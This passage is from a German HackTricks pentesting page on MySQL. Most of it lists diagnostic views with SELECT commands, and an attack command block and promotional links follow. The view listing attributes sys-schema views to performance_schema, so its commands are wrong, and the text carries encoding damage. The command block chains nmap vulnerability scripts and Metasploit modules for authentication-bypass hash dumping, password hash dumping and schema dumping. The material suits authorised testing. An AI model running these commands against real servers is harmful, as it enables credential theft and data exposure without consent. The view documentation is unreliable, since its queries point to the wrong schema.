innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory
## Schema\_Table\_Statistics
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den Tabellen in den Schemata der Datenbank.
- Befehl: `SELECT * FROM performance_schema.schema_table_statistics;`

## Schema\_Table\_Statistics\_With\_Buffer
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den Tabellen in den Schemata der Datenbank, einschlie√ülich der Pufferstatistiken.
- Befehl: `SELECT * FROM performance_schema.schema_table_statistics_with_buffer;`

## Schema\_Tables\_With\_Full\_Table\_Scans
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Tabellen in den Schemata der Datenbank, die vollst√§ndige Tabellenscans durchf√ºhren.
- Befehl: `SELECT * FROM performance_schema.schema_tables_with_full_table_scans;`

## Schema\_Unused\_Indexes
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den ungenutzten Indizes in den Schemata der Datenbank.
- Befehl: `SELECT * FROM performance_schema.schema_unused_indexes;`

## Session
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den aktuellen Sitzungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.session;`

## Session\_SSL\_Status
- Beschreibung: Diese Ansicht enth√§lt Informationen zum SSL-Status der aktuellen Sitzungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.session_ssl_status;`

## Statement\_Analysis
- Beschreibung: Diese Ansicht enth√§lt Informationen zur Analyse von SQL-Anweisungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statement_analysis;`

## Statements\_With\_Errors\_Or\_Warnings
- Beschreibung: Diese Ansicht enth√§lt Informationen zu SQL-Anweisungen mit Fehlern oder Warnungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statements_with_errors_or_warnings;`

## Statements\_With\_Full\_Table\_Scans
- Beschreibung: Diese Ansicht enth√§lt Informationen zu SQL-Anweisungen, die vollst√§ndige Tabellenscans durchf√ºhren, in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statements_with_full_table_scans;`

## Statements\_With\_Runtimes\_In\_95th\_Percentile
- Beschreibung: Diese Ansicht enth√§lt Informationen zu SQL-Anweisungen mit Laufzeiten im 95. Perzentil in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statements_with_runtimes_in_95th_percentile;`

## Statements\_With\_Sorting
- Beschreibung: Diese Ansicht enth√§lt Informationen zu SQL-Anweisungen mit Sortierungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statements_with_sorting;`

## Statements\_With\_Temp\_Tables
- Beschreibung: Diese Ansicht enth√§lt Informationen zu SQL-Anweisungen mit tempor√§ren Tabellen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.statements_with_temp_tables;`

## Sys\_Config
- Beschreibung: Diese Ansicht enth√§lt Informationen zur Konfiguration des Systems in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.sys_config;`

## User\_Summary
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary;`

## User\_Summary\_By\_File\_IO
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer nach Datei-E/A in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary_by_file_io;`

## User\_Summary\_By\_File\_IO\_Type
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer nach Datei-E/A-Typ in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary_by_file_io_type;`

## User\_Summary\_By\_Stages
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer nach Phasen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary_by_stages;`

## User\_Summary\_By\_Statement\_Latency
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer nach Anweisungsverz√∂gerung in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary_by_statement_latency;`

## User\_Summary\_By\_Statement\_Type
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten der Benutzer nach Anweisungstyp in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.user_summary_by_statement_type;`

## Version
- Beschreibung: Diese Ansicht enth√§lt Informationen zur Version der Datenbank.
- Befehl: `SELECT * FROM performance_schema.version;`

## Wait\_Classes\_Global\_By\_Avg\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Wartezeiten in den globalen Warteklassen basierend auf der durchschnittlichen Verz√∂gerung.
- Befehl: `SELECT * FROM performance_schema.wait_classes_global_by_avg_latency;`

## Wait\_Classes\_Global\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Wartezeiten in den globalen Warteklassen basierend auf der Verz√∂gerung.
- Befehl: `SELECT * FROM performance_schema.wait_classes_global_by_latency;`

## Waits\_By\_Host\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Wartezeiten nach Host und Verz√∂gerung.
- Befehl: `SELECT * FROM performance_schema.waits_by_host_by_latency;`

## Waits\_By\_User\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Wartezeiten nach Benutzer und Verz√∂gerung.
- Befehl: `SELECT * FROM performance_schema.waits_by_user_by_latency;`

## Waits\_Global\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den globalen Wartezeiten basierend auf der Verz√∂gerung.
- Befehl: `SELECT * FROM performance_schema.waits_global_by_latency;`

## X$Host\_Summary
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary;`

## X$Host\_Summary\_By\_File\_IO
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host und Datei-E/A in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary_by_file_io;`

## X$Host\_Summary\_By\_File\_IO\_Type
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host, Datei-E/A-Typ in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary_by_file_io_type;`

## X$Host\_Summary\_By\_Stages
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host und Phasen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary_by_stages;`

## X$Host\_Summary\_By\_Statement\_Latency
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host und Anweisungsverz√∂gerung in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary_by_statement_latency;`

## X$Host\_Summary\_By\_Statement\_Type
- Beschreibung: Diese Ansicht enth√§lt Zusammenfassungen der Aktivit√§ten nach Host und Anweisungstyp in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$host_summary_by_statement_type;`

## X$Innodb\_Buffer\_Stats\_By\_Schema
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den InnoDB-Pufferdaten nach Schema in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$innodb_buffer_stats_by_schema;`

## X$Innodb\_Buffer\_Stats\_By\_Table
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den InnoDB-Pufferdaten nach Tabelle in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$innodb_buffer_stats_by_table;`

## X$Innodb\_Lock\_Waits
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den InnoDB-Sperrwartungen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$innodb_lock_waits;`

## X$IO\_By\_Thread\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zur E/A nach Thread und Verz√∂gerung in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$io_by_thread_by_latency;`

## X$IO\_Global\_By\_File\_By\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zur globalen E/A nach Datei und Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$io_global_by_file_by_bytes;`

## X$IO\_Global\_By\_File\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zur globalen E/A nach Datei und Verz√∂gerung in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$io_global_by_file_by_latency;`

## X$IO\_Global\_By\_Wait\_By\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zur globalen E/A nach Wartezeit und Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$io_global_by_wait_by_bytes;`

## X$IO\_Global\_By\_Wait\_By\_Latency
- Beschreibung: Diese Ansicht enth√§lt Informationen zur globalen E/A nach Wartezeit und Verz√∂gerung in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$io_global_by_wait_by_latency;`

## X$Latest\_File\_IO
- Beschreibung: Diese Ansicht enth√§lt Informationen zur letzten Datei-E/A in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$latest_file_io;`

## X$Memory\_By\_Host\_By\_Current\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zum Speicher nach Host und aktuellen Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$memory_by_host_by_current_bytes;`

## X$Memory\_By\_Thread\_By\_Current\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zum Speicher nach Thread und aktuellen Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$memory_by_thread_by_current_bytes;`

## X$Memory\_By\_User\_By\_Current\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zum Speicher nach Benutzer und aktuellen Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$memory_by_user_by_current_bytes;`

## X$Memory\_Global\_By\_Current\_Bytes
- Beschreibung: Diese Ansicht enth√§lt Informationen zum globalen Speicher nach aktuellen Bytes in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$memory_global_by_current_bytes;`

## X$Memory\_Global\_Total
- Beschreibung: Diese Ansicht enth√§lt Informationen zum gesamten globalen Speicher in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$memory_global_total;`

## X$Processlist
- Beschreibung: Diese Ansicht enth√§lt Informationen zur aktuellen Prozessliste in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$processlist;`

## X$Ps\_Digest\_95th\_Percentile\_By\_Avg\_Us
- Beschreibung: Diese Ansicht enth√§lt Informationen zum 95. Perzentil der durchschnittlichen Verz√∂gerung von Prozessdigesten in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$ps_digest_95th_percentile_by_avg_us;`

## X$Ps\_Digest\_Avg\_Latency\_Distribution
- Beschreibung: Diese Ansicht enth√§lt Informationen zur Verteilung der durchschnittlichen Verz√∂gerung von Prozessdigesten in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$ps_digest_avg_latency_distribution;`

## X$Ps\_Schema\_Table\_Statistics\_IO
- Beschreibung: Diese Ansicht enth√§lt Informationen zur E/A von Prozessdigesten nach Schema und Tabelle in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$ps_schema_table_statistics_io;`

## X$Schema\_Flattened\_Keys
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den flachen Schl√ºsseln des Schemas in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$schema_flattened_keys;`

## X$Schema\_Index\_Statistics
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den Indizes des Schemas in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$schema_index_statistics;`

## X$Schema\_Table\_Lock\_Waits
- Beschreibung: Diese Ansicht enth√§lt Informationen zu den Sperrwartungen der Schematabellen in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$schema_table_lock_waits;`

## X$Schema\_Table\_Statistics
- Beschreibung: Diese Ansicht enth√§lt Statistiken zu den Tabellen des Schemas in der Datenbank.
- Befehl: `SELECT * FROM performance_schema.x$schema_table_statistics;`

## X$Schema\_Table\_Statistics\_With\_Buffer
- Beschreibung: Diese Ansicht
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **der Mission, technisches Wissen zu f√∂rdern**, ist dieser Kongress ein brodelnder Treffpunkt f√ºr Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
